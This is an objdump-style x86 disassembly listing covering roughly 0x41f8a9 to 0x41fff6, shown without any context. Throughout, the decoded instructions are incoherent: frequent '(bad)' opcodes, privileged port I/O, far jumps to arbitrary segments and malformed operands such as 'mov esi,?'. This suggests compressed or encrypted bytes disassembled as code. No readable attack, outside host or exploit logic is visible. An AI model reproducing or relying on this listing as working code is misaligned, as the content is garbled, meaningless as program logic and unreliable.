  41f8a9:	push   esp
  41f8aa:	sbb    DWORD PTR [ecx],esp
  41f8ac:	rol    BYTE PTR [ebp+0x7b6f4b9e],cl
  41f8b2:	xchg   ebp,eax
  41f8b3:	inc    eax
  41f8b4:	out    dx,eax
  41f8b5:	xor    DWORD PTR [edi-0x7a6022d4],ebp
  41f8bb:	fld    QWORD PTR [ebp-0x3d]
  41f8be:	sti    
  41f8bf:	mov    ecx,0x57e68cf2
  41f8c4:	cli    
  41f8c5:	cmp    edi,ecx
  41f8c7:	sub    eax,esi
  41f8c9:	cmp    ecx,DWORD PTR [ecx]
  41f8cb:	nop
  41f8cc:	(bad)  
  41f8cd:	loopne 0x41f8fa
  41f8cf:	fstp   QWORD PTR [ebx+eiz*2+0x3b]
  41f8d3:	mov    ecx,0xa2074ceb
  41f8d8:	cld    
  41f8d9:	pushf  
  41f8da:	fdiv   DWORD PTR [ebp+0x29]
  41f8dd:	push   es
  41f8de:	and    BYTE PTR [edi-0x47],ch
  41f8e1:	mov    bh,0x4e
  41f8e3:	leave  
  41f8e4:	sub    eax,0x4a0ecf3b
  41f8e9:	sbb    al,al
  41f8eb:	lods   al,BYTE PTR ds:[esi]
  41f8ec:	out    dx,eax
  41f8ed:	xor    eax,edi
  41f8ef:	push   esi
  41f8f0:	dec    esi
  41f8f1:	jl     0x41f8dc
  41f8f3:	pop    eax
  41f8f4:	push   eax
  41f8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8f6:	mov    DWORD PTR [ebx+eax*2],edx
  41f8f9:	repz jmp 0x269774cc
  41f8ff:	out    dx,eax
  41f900:	enter  0x59fc,0x32
  41f904:	(bad)  
  41f906:	shr    BYTE PTR [ebx],0xbc
  41f909:	mov    edi,0x5d45c450
  41f90e:	pop    ds
  41f90f:	cs cdq 
  41f911:	mov    esi,0xb32c957d
  41f916:	sbb    DWORD PTR [ebp-0x45],ebp
  41f919:	inc    esi
  41f91a:	fimul  WORD PTR [eax+eax*8]
  41f91d:	mov    BYTE PTR [edx-0x4e],bh
  41f920:	pop    edi
  41f921:	(bad)  
  41f922:	cmc    
  41f923:	rcl    DWORD PTR [ecx+0x47b9f806],0x92
  41f92a:	aam    0xfe
  41f92c:	cwde   
  41f92d:	xchg   edx,eax
  41f92e:	in     al,0xbb
  41f930:	repnz adc al,0xe8
  41f933:	jne    0x41f950
  41f935:	lahf   
  41f936:	imul   ebp,DWORD PTR [ebx+0x39],0x8e16a48a
  41f93d:	(bad)  [ebx+ecx*4+0x50c45239]
  41f944:	gs lahf 
  41f946:	lds    esi,FWORD PTR [ebp+0x19]
  41f949:	adc    cl,BYTE PTR [ebx+0x35]
  41f94c:	into   
  41f94d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f94e:	fcom   QWORD PTR [esi+edx*4-0x30]
  41f952:	push   ss
  41f953:	out    0xa7,al
  41f955:	std    
  41f956:	mov    cs,WORD PTR [eax+0x73]
  41f959:	in     eax,dx
  41f95a:	leave  
  41f95b:	dec    esp
  41f95c:	mov    ebx,0x8f6f59bc
  41f961:	xchg   esi,eax
  41f962:	pop    edx
  41f963:	xor    ebx,DWORD PTR [ebx]
  41f965:	aad    0x21
  41f967:	fnstenv [ebx+0x205e7f94]
  41f96d:	test   eax,0xe36311d5
  41f972:	cld    
  41f973:	mov    eax,0xff58575e
  41f978:	or     esi,ebp
  41f97a:	mov    eax,DWORD PTR [ecx+0x4a04ce77]
  41f980:	rol    BYTE PTR [edi+ebp*8+0xb123d24],0xd0
  41f988:	xchg   edi,eax
  41f989:	jge    0x41f9e7
  41f98b:	inc    edi
  41f98c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f98d:	and    BYTE PTR [eax-0x4f],ah
  41f990:	sbb    ah,0x1
  41f993:	xor    DWORD PTR [ebp+0x1b],0x5a
  41f997:	xor    eax,0xe4897f9
  41f99c:	mov    ah,0xaf
  41f99e:	lahf   
  41f99f:	std    
  41f9a0:	pop    ecx
  41f9a1:	or     BYTE PTR [edx-0x1caabe6e],dl
  41f9a7:	xor    DWORD PTR [edi+0x1a],0x20364b52
  41f9ae:	ror    DWORD PTR [edx+0x2e],0xfc
  41f9b2:	xlat   BYTE PTR ds:[ebx]
  41f9b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9b4:	push   ss
  41f9b5:	add    BYTE PTR [edi-0x38473a63],dh
  41f9bb:	adc    esp,edx
  41f9bd:	jbe    0x41f9a5
  41f9bf:	xor    DWORD PTR [ebx+edx*4],ebp
  41f9c2:	add    eax,0xacabddb8
  41f9c7:	jp     0x41f94b
  41f9c9:	div    BYTE PTR [esi-0x2b4191b8]
  41f9cf:	xchg   ebx,eax
  41f9d0:	stos   BYTE PTR es:[edi],al
  41f9d1:	retf   0xd8d7
  41f9d4:	dec    esp
  41f9d5:	clc    
  41f9d6:	pop    ecx
  41f9d7:	(bad)  
  41f9d8:	jmp    0x9624:0x9d7646cc
  41f9df:	or     bl,bh
  41f9e1:	cwde   
  41f9e2:	jno    0x41fa21
  41f9e4:	ds inc esi
  41f9e6:	pop    esi
  41f9e7:	xor    eax,0xababf16
  41f9ec:	xor    ebx,DWORD PTR [edi]
  41f9ee:	mov    BYTE PTR [edi],bl
  41f9f0:	mov    eax,ds:0x5a02dbcf
  41f9f5:	out    dx,al
  41f9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9f7:	sub    BYTE PTR [ecx+0x699acf1a],dh
  41f9fd:	or     al,0x35
  41f9ff:	jecxz  0x41f9b6
  41fa01:	push   edi
  41fa02:	mov    ebx,0xa4173b9d
  41fa07:	mov    al,0x2
  41fa09:	jno    0x41fa5a
  41fa0b:	dec    ebp
  41fa0c:	sub    bh,ah
  41fa0e:	clc    
  41fa0f:	pop    ebp
  41fa10:	or     BYTE PTR [ecx-0x3b9c6556],ah
  41fa16:	push   cs
  41fa17:	int    0x7d
  41fa19:	xchg   esp,eax
  41fa1a:	sub    ecx,eax
  41fa1c:	dec    ebp
  41fa1d:	hlt    
  41fa1e:	ret    
  41fa1f:	mov    ebx,0x5fee9987
  41fa24:	ins    BYTE PTR es:[edi],dx
  41fa25:	dec    ebp
  41fa26:	stos   DWORD PTR es:[edi],eax
  41fa27:	mov    bh,bl
  41fa29:	int    0x46
  41fa2b:	out    0xf1,eax
  41fa2d:	mov    eax,0x20a62af8
  41fa32:	push   edx
  41fa33:	and    esp,DWORD PTR [edi-0x2dec7801]
  41fa39:	push   edx
  41fa3a:	adc    al,0xf
  41fa3c:	push   ss
  41fa3d:	dec    edx
  41fa3e:	pop    ecx
  41fa3f:	fcmovu st,st(3)
  41fa41:	sub    BYTE PTR fs:[esi+ebx*2],0x0
  41fa46:	jecxz  0x41f9cb
  41fa48:	inc    edi
  41fa49:	mov    ebx,0x47c694cb
  41fa4e:	xchg   ebp,eax
  41fa4f:	cmp    eax,0xf379f5d1
  41fa54:	fwait
  41fa55:	call   DWORD PTR [esi]
  41fa57:	mov    al,ds:0xa0a94bc1
  41fa5c:	pop    ds
  41fa5d:	outs   dx,BYTE PTR ds:[esi]
  41fa5e:	dec    ebp
  41fa5f:	imul   edi,DWORD PTR cs:[esi+0x37],0x6c5eafda
  41fa67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa68:	sbb    BYTE PTR [ebx+0x30],ch
  41fa6b:	adc    al,0xba
  41fa6d:	mov    ebp,0x54514018
  41fa72:	mov    esi,?
  41fa74:	inc    eax
  41fa75:	jbe    0x41fac3
  41fa77:	adc    eax,0xf01180c8
  41fa7c:	bound  esp,QWORD PTR [ecx-0x4c]
  41fa7f:	push   ecx
  41fa80:	lods   eax,DWORD PTR ds:[esi]
  41fa81:	cwde   
  41fa82:	adc    al,0x20
  41fa84:	xchg   esp,eax
  41fa85:	jle    0x41fa96
  41fa87:	daa    
  41fa88:	jp     0x41fa0e
  41fa8a:	aam    0x76
  41fa8c:	(bad)  
  41fa8d:	pop    ecx
  41fa8e:	xchg   edi,eax
  41fa8f:	add    DWORD PTR ds:0x51c49b5c,edi
  41fa95:	ja     0x41fafc
  41fa97:	mov    ebp,0xa67bc786
  41fa9c:	cmp    ah,BYTE PTR [ebp-0x4c]
  41fa9f:	adc    DWORD PTR [esi+0x37],eax
  41faa2:	fdiv   QWORD PTR [edi+eiz*4-0xca919d4]
  41faa9:	loop   0x41faab
  41faab:	mov    ecx,0x645cc2f
  41fab0:	mov    ebp,0x340a294e
  41fab5:	push   0xfa4f7a52
  41faba:	(bad)  
  41fabb:	cmp    edx,DWORD PTR [edx]
  41fabd:	jl     0x41fa62
  41fabf:	push   edx
  41fac0:	test   BYTE PTR [ecx],bl
  41fac2:	das    
  41fac3:	add    ecx,DWORD PTR [ecx]
  41fac5:	out    0xdc,al
  41fac7:	imul   esi,DWORD PTR [ebp-0x2f231af6],0x816f5847
  41fad1:	dec    eax
  41fad2:	mov    edx,0xb966a48a
  41fad7:	sbb    ecx,ebx
  41fad9:	in     eax,dx
  41fada:	shl    ecx,cl
  41fadc:	fwait
  41fadd:	cmp    DWORD PTR [edi],edi
  41fadf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fae0:	mov    ds:0x5405d38e,al
  41fae5:	out    dx,eax
  41fae6:	cmp    ch,BYTE PTR [ebx-0x8]
  41fae9:	data16 clc 
  41faeb:	or     eax,0x91dd2be7
  41faf0:	cmp    al,0xfd
  41faf2:	add    eax,0xfc324dea
  41faf7:	neg    DWORD PTR [eax-0x2dd84532]
  41fafd:	push   0x2f
  41faff:	cmp    dh,cl
  41fb01:	mov    bh,0xf6
  41fb03:	pop    esp
  41fb04:	inc    ebp
  41fb05:	arpl   WORD PTR [ebp+0x31],dx
  41fb08:	(bad)  [edx-0x666930a5]
  41fb0e:	daa    
  41fb0f:	inc    eax
  41fb10:	std    
  41fb11:	in     al,0x7f
  41fb13:	xchg   ebp,eax
  41fb14:	xor    BYTE PTR [edi],cl
  41fb16:	mov    WORD PTR [ebp+0x39],ds
  41fb19:	gs jge 0x41fae5
  41fb1c:	inc    ebp
  41fb1d:	shl    DWORD PTR [esi+0x56],0x1
  41fb21:	cmp    ebx,DWORD PTR [esi]
  41fb23:	jp     0x41fb64
  41fb25:	fld    TBYTE PTR cs:0x5a03b495
  41fb2c:	mov    fs,WORD PTR [ecx+edx*4+0x6010b8d7]
  41fb33:	sti    
  41fb34:	in     al,dx
  41fb35:	inc    ebp
  41fb36:	xchg   ebp,eax
  41fb37:	jnp    0x41fb81
  41fb39:	xchg   esp,eax
  41fb3a:	sub    BYTE PTR [esi+edi*4+0x294e6155],bh
  41fb41:	inc    DWORD PTR [edx-0x5c]
  41fb44:	push   es
  41fb45:	out    0x8b,al
  41fb47:	push   0xd41c09f8
  41fb4c:	sbb    eax,0x66d41a71
  41fb51:	cld    
  41fb52:	fldenv [esi+0x763a9c6a]
  41fb58:	pop    eax
  41fb59:	fisubr WORD PTR [edx+0x9]
  41fb5c:	loopne 0x41fb5a
  41fb5e:	add    BYTE PTR [edi],0x1
  41fb61:	sub    esi,esi
  41fb63:	mov    esi,DWORD PTR [edx+eax*2-0x3e394f42]
  41fb6a:	outs   dx,BYTE PTR ds:[esi]
  41fb6b:	jbe    0x41fb64
  41fb6d:	push   ebx
  41fb6e:	sbb    ah,ah
  41fb70:	push   esp
  41fb71:	pop    ebp
  41fb72:	pop    ecx
  41fb73:	mov    bl,BYTE PTR [eax]
  41fb75:	add    BYTE PTR [ecx],ah
  41fb77:	adc    esi,0xd99ef0f6
  41fb7d:	xor    BYTE PTR [esi-0x20a4196c],0x7d
  41fb84:	loopne 0x41fb4c
  41fb86:	cmp    DWORD PTR [esp+ecx*1],0x3c
  41fb8a:	sbb    eax,0x51496874
  41fb8f:	pop    esp
  41fb90:	fucomip st,st(2)
  41fb92:	ret    0xd5a4
  41fb95:	and    al,0x83
  41fb97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb98:	sbb    BYTE PTR [ebx+0xc],cl
  41fb9b:	mov    al,ds:0xdae83e8b
  41fba0:	ret    
  41fba1:	mov    eax,0xce26e825
  41fba6:	jbe    0x41fb88
  41fba8:	cwde   
  41fba9:	out    0xa7,al
  41fbab:	push   es
  41fbac:	inc    edi
  41fbad:	push   0xffffffcf
  41fbaf:	ins    DWORD PTR es:[edi],dx
  41fbb0:	adc    BYTE PTR [eax],0xe7
  41fbb3:	popa   
  41fbb4:	jnp    0x41fb99
  41fbb6:	jb     0x41fbc9
  41fbb8:	js     0x41fc00
  41fbba:	jg     0x41fb46
  41fbbc:	xchg   edi,eax
  41fbbd:	xchg   ebp,eax
  41fbbe:	inc    esp
  41fbbf:	shl    DWORD PTR [eax],0x78
  41fbc2:	outs   dx,BYTE PTR ds:[esi]
  41fbc3:	shl    DWORD PTR [esi+0x737618c2],1
  41fbc9:	adc    esp,DWORD PTR [edx+ecx*8+0x6695c513]
  41fbd0:	mov    ch,0xef
  41fbd2:	call   0x1325:0xaa06aec6
  41fbd9:	repz sub eax,esp
  41fbdc:	das    
  41fbdd:	ds (bad) 
  41fbdf:	fcom   DWORD PTR [ebp-0x7f]
  41fbe2:	loop   0x41fc2e
  41fbe4:	inc    ebx
  41fbe5:	cmp    BYTE PTR [edi-0x59],ah
  41fbe8:	mov    BYTE PTR [esi-0x7e3f63d6],cl
  41fbee:	adc    al,0x27
  41fbf0:	arpl   WORD PTR [ebx+0x6360822f],ax
  41fbf6:	mov    al,ds:0xf562bd0
  41fbfb:	xchg   dl,ch
  41fbfd:	arpl   ax,cx
  41fbff:	aaa    
  41fc00:	lods   eax,DWORD PTR ds:[esi]
  41fc01:	loopne 0x41fc24
  41fc03:	inc    ebp
  41fc04:	sub    al,al
  41fc06:	pop    ds
  41fc07:	push   0x12
  41fc09:	sbb    dh,dl
  41fc0b:	sti    
  41fc0c:	(bad)  [esp+esi*4]
  41fc0f:	bound  ebp,QWORD PTR [ebx-0x26]
  41fc12:	stc    
  41fc13:	retf   0xff54
  41fc16:	out    dx,al
  41fc17:	div    bl
  41fc19:	lahf   
  41fc1a:	or     ebp,DWORD PTR [ebx+0x5a105519]
  41fc20:	loopne 0x41fc52
  41fc22:	jmp    0x41fc9b
  41fc24:	push   esp
  41fc25:	mov    esi,0x63000f8b
  41fc2a:	outs   dx,DWORD PTR ds:[esi]
  41fc2b:	xor    eax,0xd02b4b06
  41fc30:	adc    ch,BYTE PTR fs:[edx+ebp*8+0x70]
  41fc35:	mov    ebx,DWORD PTR [esi-0x471c911d]
  41fc3b:	fld    st(1)
  41fc3d:	push   ds
  41fc3e:	(bad)  
  41fc3f:	push   esi
  41fc40:	ret    0x93ad
  41fc43:	mov    edi,0xf7ac74a4
  41fc48:	inc    esp
  41fc49:	(bad)  [ecx+eax*4]
  41fc4c:	test   DWORD PTR [edi+0x6a],esi
  41fc4f:	jb     0x41fc1c
  41fc51:	outs   dx,BYTE PTR ds:[esi]
  41fc52:	jle    0x41fcd2
  41fc54:	aaa    
  41fc55:	test   DWORD PTR [esi+0x7c197183],esi
  41fc5b:	push   ebp
  41fc5c:	push   edx
  41fc5d:	neg    DWORD PTR ds:0xf4119b47
  41fc63:	ins    BYTE PTR es:[edi],dx
  41fc64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc65:	adc    eax,0x5354e45a
  41fc6a:	aas    
  41fc6b:	cmp    al,0x6c
  41fc6d:	add    eax,0x9ff2bc52
  41fc72:	xor    ebx,DWORD PTR [ebp-0x4a]
  41fc75:	add    edx,ebp
  41fc77:	stc    
  41fc78:	or     bl,bh
  41fc7a:	mov    DWORD PTR [edi+0x41],ebp
  41fc7d:	jmp    0xcf12:0x8a48e7ca
  41fc84:	adc    al,0x0
  41fc86:	loop   0x41fccc
  41fc88:	leave  
  41fc89:	mov    dl,0x8c
  41fc8b:	mov    ds:0x29993b24,eax
  41fc90:	dec    ecx
  41fc91:	not    DWORD PTR [ecx-0x51]
  41fc94:	cs pop esp
  41fc96:	pop    edx
  41fc97:	mov    edi,0x6481b4e3
  41fc9c:	inc    esp
  41fc9d:	retf   
  41fc9e:	lds    ebx,FWORD PTR [edx]
  41fca0:	lock aaa 
  41fca2:	jo     0x41fcde
  41fca4:	lds    ebx,FWORD PTR [ebx+eax*4]
  41fca7:	mov    bl,0x20
  41fca9:	out    0x48,eax
  41fcab:	test   eax,0xedb575ce
  41fcb0:	mov    ah,0xfc
  41fcb2:	add    BYTE PTR [ebx],0x3f
  41fcb5:	popa   
  41fcb6:	jg     0x41fcc4
  41fcb8:	test   cl,0xba
  41fcbb:	popf   
  41fcbc:	sahf   
  41fcbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcbe:	out    dx,eax
  41fcbf:	fbstp  TBYTE PTR [ebx]
  41fcc1:	push   esp
  41fcc2:	inc    ecx
  41fcc3:	sbb    edx,DWORD PTR [edi]
  41fcc5:	ret    0xd3d1
  41fcc8:	ins    BYTE PTR es:[edi],dx
  41fcc9:	cli    
  41fcca:	push   0xc99d3bcc
  41fccf:	jg     0x41fc6e
  41fcd1:	dec    eax
  41fcd2:	ins    DWORD PTR es:[edi],dx
  41fcd3:	aas    
  41fcd4:	aad    0x48
  41fcd6:	xor    eax,0xd3f7d55e
  41fcdb:	ror    BYTE PTR [edi],0xe2
  41fcde:	imul   esi,DWORD PTR [ecx-0x36a23ea7],0x2
  41fce5:	mov    eax,0xe112b540
  41fcea:	addr16 in al,dx
  41fcec:	and    al,0x14
  41fcee:	xor    al,BYTE PTR [eax-0x10bca05b]
  41fcf4:	mov    esp,0xdc85adad
  41fcf9:	cmp    al,BYTE PTR [ebx+0x35]
  41fcfc:	out    dx,eax
  41fcfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcfe:	and    eax,0x73c65d2f
  41fd03:	aad    0x76
  41fd05:	rcl    BYTE PTR [edx],0x7
  41fd08:	ret    
  41fd09:	and    BYTE PTR [edi+0x41],cl
  41fd0c:	sub    al,0x86
  41fd0e:	jbe    0x41fd59
  41fd10:	adc    ah,cl
  41fd12:	fisttp QWORD PTR [eax]
  41fd14:	sub    dl,ah
  41fd16:	add    eax,0x4ec3453
  41fd1b:	or     esp,esi
  41fd1d:	inc    ebx
  41fd1e:	int3   
  41fd1f:	mov    WORD PTR [ebx+0x641ae944],gs
  41fd25:	in     eax,dx
  41fd26:	sub    DWORD PTR [esi-0x20],eax
  41fd29:	push   eax
  41fd2a:	fdiv   DWORD PTR [ecx+0x24]
  41fd2d:	mov    ds:0x564b740f,al
  41fd32:	fbstp  TBYTE PTR [edx-0x68aae043]
  41fd38:	mov    dl,bl
  41fd3a:	or     BYTE PTR [edi+esi*4],bh
  41fd3d:	fsubr  QWORD PTR [ebx+0x2b]
  41fd40:	retf   0x481
  41fd43:	push   eax
  41fd44:	(bad)  
  41fd45:	lds    ebx,FWORD PTR [ecx]
  41fd47:	repz sub al,0x91
  41fd4a:	fisubr DWORD PTR [ecx-0x5675926c]
  41fd50:	mov    dh,0x4f
  41fd52:	inc    edi
  41fd53:	lahf   
  41fd54:	outs   dx,DWORD PTR ds:[esi]
  41fd55:	xchg   edx,eax
  41fd56:	xor    eax,0xdeb7ed68
  41fd5b:	xchg   esp,eax
  41fd5c:	ins    DWORD PTR es:[edi],dx
  41fd5d:	aaa    
  41fd5e:	mov    eax,ds:0x677438b4
  41fd63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd64:	pusha  
  41fd65:	sub    edi,DWORD PTR [edx-0x237fae89]
  41fd6b:	retf   0x100d
  41fd6e:	cdq    
  41fd6f:	pop    eax
  41fd70:	inc    ebx
  41fd71:	adc    ah,bh
  41fd73:	adc    esi,DWORD PTR [esi+ebx*1]
  41fd76:	sub    ah,BYTE PTR [edi]
  41fd78:	sub    bl,ch
  41fd7a:	cmp    dl,BYTE PTR [edx-0x451c9104]
  41fd80:	mov    bl,0x71
  41fd82:	push   0xf0a5d38f
  41fd87:	xchg   DWORD PTR [edi+0x2a],edi
  41fd8a:	repz add bl,BYTE PTR [esi]
  41fd8d:	sbb    DWORD PTR [edi+0x2b],edx
  41fd90:	and    eax,0x8c6f0282
  41fd95:	sbb    eax,DWORD PTR [ecx-0x7e]
  41fd98:	lods   al,BYTE PTR ds:[esi]
  41fd99:	fdivr  st(6),st
  41fd9b:	jne    0x41fdc4
  41fd9d:	push   eax
  41fd9e:	call   0x1be5:0xabeecd89
  41fda5:	mov    esi,0xdd455625
  41fdaa:	fdecstp 
  41fdac:	daa    
  41fdad:	inc    ebx
  41fdae:	mov    bh,0x26
  41fdb0:	mov    eax,ds:0x31c22067
  41fdb5:	adc    edi,ecx
  41fdb7:	dec    edx
  41fdb8:	sub    DWORD PTR [edx],ebp
  41fdba:	test   DWORD PTR [ecx],edx
  41fdbc:	mov    bh,ah
  41fdbe:	push   ds
  41fdbf:	mov    edx,0x36f44284
  41fdc4:	xchg   ebp,eax
  41fdc5:	(bad)  
  41fdc6:	dec    ebp
  41fdc7:	add    al,0x3a
  41fdc9:	mov    bl,0x4
  41fdcb:	fwait
  41fdcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdcd:	pop    ebp
  41fdce:	test   BYTE PTR [eax+0x173c8e32],dh
  41fdd4:	dec    esi
  41fdd5:	addr16 fwait
  41fdd7:	fwait
  41fdd8:	xor    eax,0xde7431b5
  41fddd:	mov    esp,?
  41fddf:	es repz or al,0x99
  41fde3:	(bad)  
  41fde4:	lahf   
  41fde5:	jmp    0xa61747d4
  41fdea:	jb     0x41fdc4
  41fdec:	in     eax,dx
  41fded:	inc    eax
  41fdee:	mov    ecx,0xa6cc591
  41fdf3:	shl    DWORD PTR [edx],0x22
  41fdf6:	imul   esp,DWORD PTR [eax-0x69bb06d4],0xffffffdd
  41fdfd:	sbb    ebp,eax
  41fdff:	lea    ecx,[eax-0x7]
  41fe02:	mov    bh,0x6d
  41fe04:	add    eax,0x187dafeb
  41fe09:	and    cl,BYTE PTR [edi-0x34b6d084]
  41fe0f:	push   esp
  41fe10:	loope  0x41fe28
  41fe12:	and    BYTE PTR [esi],al
  41fe14:	into   
  41fe15:	pop    esi
  41fe16:	test   ebp,ebp
  41fe18:	mov    ah,cl
  41fe1a:	adc    al,al
  41fe1c:	enter  0x1e4f,0x8e
  41fe20:	pop    ebp
  41fe21:	add    bl,bl
  41fe23:	push   0xe99927ff
  41fe28:	xchg   edi,eax
  41fe29:	es push es
  41fe2b:	xchg   ecx,eax
  41fe2c:	scas   eax,DWORD PTR es:[edi]
  41fe2d:	sahf   
  41fe2e:	xchg   edi,eax
  41fe2f:	sbb    ecx,DWORD PTR [esi+esi*8]
  41fe32:	and    ch,0xb4
  41fe35:	xlat   BYTE PTR ds:[ebx]
  41fe36:	loop   0x41fdee
  41fe38:	shl    BYTE PTR [ebx],cl
  41fe3a:	in     eax,dx
  41fe3b:	enter  0x67a0,0x9b
  41fe3f:	pop    esi
  41fe40:	aad    0x6c
  41fe42:	fmul   QWORD PTR [ecx+0x6d837f0c]
  41fe48:	test   eax,0xdb4c3de4
  41fe4d:	pop    eax
  41fe4e:	adc    eax,0x15ca8392
  41fe53:	mov    bh,0x62
  41fe55:	inc    ecx
  41fe56:	fcmovnb st,st(1)
  41fe58:	aas    
  41fe59:	jb     0x41fec0
  41fe5b:	adc    eax,0xb3da4e1e
  41fe60:	call   0x4b4dd69b
  41fe65:	dec    edx
  41fe66:	cs inc edi
  41fe68:	aad    0x6f
  41fe6a:	add    ch,0x4a
  41fe6d:	cli    
  41fe6e:	mov    DWORD PTR [edx],edx
  41fe70:	(bad)  
  41fe71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe72:	imul   esi,DWORD PTR [ebx+0x79],0xffffff91
  41fe76:	aaa    
  41fe77:	and    bh,bh
  41fe79:	cmp    edx,ebx
  41fe7b:	adc    esp,edi
  41fe7d:	or     DWORD PTR [eax+0x7d],edx
  41fe80:	gs dec eax
  41fe82:	sahf   
  41fe83:	pushf  
  41fe84:	push   DWORD PTR [esi]
  41fe86:	pop    DWORD PTR [edi+0xaaa80f3]
  41fe8c:	in     eax,dx
  41fe8d:	push   0x348926e0
  41fe92:	ss mov esi,0xfce36848
  41fe98:	mov    gs,WORD PTR [ecx]
  41fe9a:	push   edi
  41fe9b:	outs   dx,DWORD PTR ds:[esi]
  41fe9c:	clc    
  41fe9d:	rcl    BYTE PTR [edx+0x112d62eb],1
  41fea3:	xor    cl,BYTE PTR [ebp+0x3f1a7567]
  41fea9:	clc    
  41feaa:	into   
  41feab:	push   ebp
  41feac:	test   al,0x78
  41feae:	inc    edx
  41feaf:	cmp    ah,BYTE PTR [esi]
  41feb1:	gs pop ds
  41feb3:	in     al,dx
  41feb4:	ror    BYTE PTR [ebp+0x7161323c],cl
  41feba:	pop    edi
  41febb:	mov    eax,0xd2eb90c0
  41fec0:	xchg   BYTE PTR [esi+ebp*2],bl
  41fec3:	sahf   
  41fec4:	loope  0x41fef8
  41fec6:	call   0x818592d6
  41fecb:	xor    al,0x7b
  41fecd:	xchg   ecx,eax
  41fece:	gs mov cl,0x74
  41fed1:	cmp    al,0x5c
  41fed3:	push   ds
  41fed4:	mov    ah,0xa9
  41fed6:	add    BYTE PTR [esp+eiz*4-0x51],0x86
  41fedb:	imul   ebx,DWORD PTR [ebp-0x76],0xfffffff7
  41fedf:	bound  ebp,QWORD PTR ds:0xcdb19899
  41fee5:	jmp    0x41ff42
  41fee7:	retf   
  41fee8:	mov    ah,0x6d
  41feea:	js     0x41ff5c
  41feec:	adc    ah,BYTE PTR [eax+edi*1]
  41feef:	pop    edi
  41fef0:	cs pop ss
  41fef2:	aam    0xb8
  41fef4:	fimul  WORD PTR [ebx+0x3747d7a]
  41fefa:	and    al,0x15
  41fefc:	int3   
  41fefd:	push   ecx
  41fefe:	add    eax,0x7011997e
  41ff03:	fistp  QWORD PTR [edx]
  41ff05:	xchg   ebx,eax
  41ff06:	sub    DWORD PTR [ebp+0x11de5115],ecx
  41ff0c:	sar    dl,cl
  41ff0e:	fstp   TBYTE PTR [ebx+ebp*1-0x4f]
  41ff12:	mov    ch,0xb9
  41ff14:	pop    ecx
  41ff15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff16:	or     al,0x22
  41ff18:	xchg   esi,eax
  41ff19:	pop    eax
  41ff1a:	rcl    BYTE PTR [esi+0x4a7f6851],0x95
  41ff21:	mov    ebp,0xa52ca593
  41ff26:	or     eax,0x27682da1
  41ff2b:	outs   dx,DWORD PTR ds:[esi]
  41ff2c:	mov    al,ds:0x3dafdf8
  41ff31:	dec    ebx
  41ff32:	pop    edi
  41ff33:	sbb    DWORD PTR [bp+si+0x72],ebx
  41ff37:	fimul  WORD PTR [edx+0x1a]
  41ff3a:	cmp    al,0x5
  41ff3c:	xchg   ebp,eax
  41ff3d:	rcl    DWORD PTR [edx+0x310a1559],cl
  41ff43:	sbb    al,0xc3
  41ff45:	dec    ebx
  41ff47:	cwde   
  41ff48:	pop    ebp
  41ff49:	or     eax,0x526b289
  41ff4e:	jl     0x41ff40
  41ff50:	(bad)  
  41ff51:	or     cl,BYTE PTR [ebx-0x3e7a6c03]
  41ff57:	mov    eax,0x4ec7f682
  41ff5c:	xor    DWORD PTR [ebx+0x42],0x45
  41ff60:	xchg   edx,eax
  41ff61:	fisttp DWORD PTR [ebx]
  41ff63:	xchg   ebx,eax
  41ff64:	lea    esi,[edx-0x51]
  41ff67:	loope  0x41ff9f
  41ff69:	dec    esp
  41ff6a:	mov    bl,BYTE PTR [eax+0x3e]
  41ff6d:	fild   QWORD PTR [eax]
  41ff6f:	enter  0x1a9b,0x1c
  41ff73:	ret    0x93d3
  41ff76:	leave  
  41ff77:	xchg   ebx,eax
  41ff78:	or     eax,0x6b6b8c08
  41ff7d:	js     0x41ff42
  41ff7f:	int3   
  41ff80:	sbb    eax,edi
  41ff82:	ds imul esi,esp,0x4bb9bb41
  41ff89:	dec    eax
  41ff8a:	rcl    BYTE PTR [ecx+0xd7ab4d9],cl
  41ff90:	jmp    0x3129:0x3ad55861
  41ff97:	(bad)  
  41ff98:	out    0x8e,al
  41ff9a:	ds std 
  41ff9c:	pop    edi
  41ff9d:	cmp    cx,bx
  41ffa0:	xor    eax,0xaae62f9
  41ffa5:	mov    esi,0xbb7e76f1
  41ffaa:	iret   
  41ffab:	dec    esi
  41ffac:	xor    eax,DWORD PTR [edx+0x4b41fe05]
  41ffb2:	js     0x42000c
  41ffb4:	push   esi
  41ffb5:	cmp    edx,DWORD PTR [esi-0x30699862]
  41ffbb:	xlat   BYTE PTR ds:[ebx]
  41ffbc:	test   al,0xca
  41ffbe:	test   bl,dl
  41ffc0:	jb     0x41ffab
  41ffc2:	retf   
  41ffc3:	js     0x41ffcd
  41ffc5:	push   ebp
  41ffc6:	sahf   
  41ffc7:	scas   al,BYTE PTR es:[edi]
  41ffc8:	loop   0x41fff7
  41ffca:	daa    
  41ffcb:	dec    ebx
  41ffcc:	daa    
  41ffcd:	aaa    
  41ffce:	dec    ebx
  41ffcf:	add    al,0x51
  41ffd1:	popf   
  41ffd2:	rcl    DWORD PTR [esi-0x220e63fc],cl
  41ffd8:	sbb    bh,BYTE PTR [edx]
  41ffda:	es and eax,0xf0e1a9ab
  41ffe0:	call   0x726a9a0d
  41ffe5:	(bad)  
  41ffe6:	jnp    0x420024
  41ffe8:	inc    edi
  41ffe9:	mov    eax,ds:0x27ba3583
  41ffee:	sbb    BYTE PTR gs:[ebx-0x56],dl
  41fff2:	mov    cl,0xe9
  41fff4:	push   edx
  41fff5:	in     al,dx
  41fff6:	mov    DWORD PTR [edi],eax
